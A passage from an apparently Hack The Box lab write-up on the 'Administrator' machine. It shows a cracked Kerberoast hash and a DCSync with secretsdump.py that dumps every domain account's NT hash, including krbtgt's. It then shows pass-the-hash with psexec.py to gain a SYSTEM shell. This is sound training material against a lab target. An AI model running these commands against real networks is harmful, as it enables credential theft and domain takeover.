&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Hashes&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="n">digests&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="n">unique&lt;/span> &lt;span class="n">digests&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="n">unique&lt;/span> &lt;span class="n">salts&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Bitmaps&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">16&lt;/span> &lt;span class="n">bits&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mf">65536&lt;/span> &lt;span class="n">entries&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">0x0000ffff&lt;/span> &lt;span class="n">mask&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mf">262144&lt;/span> &lt;span class="n">bytes&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mf">5&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">13&lt;/span> &lt;span class="n">rotates&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Rules&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Optimizers&lt;/span> &lt;span class="n">applied&lt;/span>&lt;span class="err">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">*&lt;/span> &lt;span class="nb">Zero-Byte&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">*&lt;/span> &lt;span class="nb">Not-Iterated&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">*&lt;/span> &lt;span class="nb">Single-Hash&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">*&lt;/span> &lt;span class="nb">Single-Salt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">SNIP&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$krb5tgs$23&lt;/span>&lt;span class="p">$*&lt;/span>&lt;span class="n">ethan&lt;/span>&lt;span class="nv">$ADMINISTRATOR&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">HTB&lt;/span>&lt;span class="nv">$Administrator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">htb&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">ethan&lt;/span>&lt;span class="p">*&lt;/span>&lt;span class="nv">$7bed537141bd14d91ba9ec5be93a956b$7c4184b5c470bd1bfeef1794bf3a54b3b246d35ca9d23eb544292a5e3331f28955b3381c00d3edf7d00d65c8d481e7ce6370ba842ad7068d3ec6f7725f138ae2ef4144f5422f35c9a27e9bb03870f5697bcbace85e4a7514d578e611a1c69e25d723afa0c01060e7b5e05639189f749cf994a4937ac1a3ff45c987f3985973f5000bacb87ca84765f889d8a70d652cf9fc9a928611bb49c4334b8923559a906b1b4b6d43a3ce180fed0be3475daab72d296613feba6f87e15d593a5cf7f9c9d81e9f44279e727e2ced375cb5022d7c26f64d4f7c1af67fa95f297cb0bafa1048b219158df8a21c16b44fb407c57232f9cafaad3693798d78bcbb989f6404f4ee58349dbb4478e31efc3d8eb686af9054f30c77dae7f0c9103cc7ddc3ea09dd5f81c3c6b000142fb51371ce05959b7fa830eb3a8fa006d0afa2a193c7bfcfb4868ad6a1c7497dbf4dc499bd19fffbdf8840c3faa074b1fc6dbddc849050aeafe55a71cf40297489a6cfbcc9cca26f5004fdb46187466c97646b289b5c486c6a443992da66a881960547b29237ec18cef499889d327926674f2e8f8de54d232eaa6875bf8cead86fd54f1a254335e286bfd6a9345de418d392e324ec79148184f6f6fc41ccaf42c850409ffa2b6bce9c37c619e5037a4394ad35dee0e49121da74d981d84ae8e386be5ed407f1d5cafc22ab8f74ee1870c4a3f3dac65763fba369e61baa086ebe7e109a1ef1ac329d73770e1e76b02740e895e8cce3b6013aeb3ba5717fb6ddbf12af3e69043b0f7e9e0d1f56ba158e6e49a47d96021766a9687537eec9485076f52982ffb5dae667bee6b92b0f6d594cc47f984e9bac0002ab3ac4105ed1a2de8ea9e8107e98a7d8455e3ec206edf2e4d29756809f7f1453e93b9b3dfe5a5763c9f234f68da0265ec886c47f05a16e31735c41c37f9126954e30080d6a57076c3f53cbfe9646f1d849f8ad60aec35f2c3bb87850d501a3597f26b4ad5f7d06a32bfdcc719ca701e8e4ad61280dd41035e354719affc7a10a2f1145487e458c6c1b20da2a78db81093e2666b54fe20b96fb7c8e1c891faef2b4103151d5a7779caa0d53fbbb0d0dea94a18b0d780536cd7e27f3c02afbed8fcb3dd54b8d194e64f895095c0f7047a38ddfcfba1e09b973408e95c2b9d26cd7f870e1969408cc3d6a5ddecdc29290cffc80fe951784b5c3f85a61425df971f37e3d83e8a0d8280814a38ff3ec99ead94bd2c9711a1f74f866295af0ec2a217def2dcf325e0ed27e15a912b00f08a797511665736dd26472bb3925fa591f44a2a511105f44a9a89480ef84a740ff7ae5859fbe71dbc15c1b2da91703bde841a07bcbf2708d262d2df115131d80563b12527316315361585bf59bb61b5bf52bc610ff3675415c26cc6d4e0e43c7370997f6049467a36ac080a1c95cbaa91baa729d992e8712f308303f1f73d1221095c237bb88c41a320eeee5bd96a03aadf0d354ed486ca41e56d48d2ce13f610c4ddbf2bade912767f2f20b5e71016021def06c&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">limpbizkit&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Let&amp;rsquo;s now &lt;code>DCSync&lt;/code> the domain and dump all hashes of all users of the &lt;code>administrator.htb&lt;/code> domain.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>/opt/targetedKerberoast&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo secretsdump.py &lt;span class="s2">&amp;#34;Administrator.htb/ethan:limpbizkit&amp;#34;&lt;/span>@&lt;span class="s2">&amp;#34;dc.Administrator.htb&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Dumping Domain Credentials &lt;span class="o">(&lt;/span>domain&lt;span class="se">\u&lt;/span>id:rid:lmhash:nthash&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using the DRSUAPI method to get NTDS.DIT secrets
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">administrator.htb&lt;span class="se">\o&lt;/span>livia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">administrator.htb&lt;span class="se">\m&lt;/span>ichael:1109:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">administrator.htb&lt;span class="se">\b&lt;/span>enjamin:1110:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">administrator.htb&lt;span class="se">\e&lt;/span>mily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">administrator.htb&lt;span class="se">\e&lt;/span>than:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">administrator.htb&lt;span class="se">\a&lt;/span>lexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">administrator.htb&lt;span class="se">\e&lt;/span>mma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;SNIP&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Finally, we will use the &lt;code>psexec.py&lt;/code> to get a shell as the &lt;code>administrator&lt;/code> using his NT hash that we got from above, and then get the &lt;code>root.txt&lt;/code> flag.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>/opt/targetedKerberoast&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ psexec.py &lt;span class="s1">&amp;#39;administrator.htb/Administrator@10.10.11.42&amp;#39;&lt;/span> -hashes aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Requesting shares on 10.10.11.42.....
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Found writable share ADMIN$
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Uploading file HpFTdtnz.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Opening SVCManager on 10.10.11.42.....
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Creating service xqpP on 10.10.11.42.....
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Starting service xqpP.....
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>!&lt;span class="o">]&lt;/span> Press &lt;span class="nb">help&lt;/span> &lt;span class="k">for&lt;/span> extra shell commands
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Microsoft Windows &lt;span class="o">[&lt;/span>Version 10.0.20348.2762&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>c&lt;span class="o">)&lt;/span> Microsoft Corporation. All rights reserved.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\s&lt;/span>ystem32&amp;gt; whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nt authority&lt;span class="se">\s&lt;/span>ystem
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\s&lt;/span>ystem32&amp;gt; &lt;span class="nb">cd&lt;/span> C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\D&lt;/span>esktop
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\D&lt;/span>esktop&amp;gt; dir
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Volume in drive C has no label.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Volume Serial Number is 6131-DE70
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Directory of C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\D&lt;/span>esktop
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">11/01/2024 02:47 PM &amp;lt;DIR&amp;gt; .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">10/22/2024 11:46 AM &amp;lt;DIR&amp;gt; ..
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">03/28/2025 10:01 AM &lt;span class="m">34&lt;/span> root.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1&lt;/span> File&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> &lt;span class="m">34&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2&lt;/span> Dir&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> 8,439,169,024 bytes free
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item></channel></rss>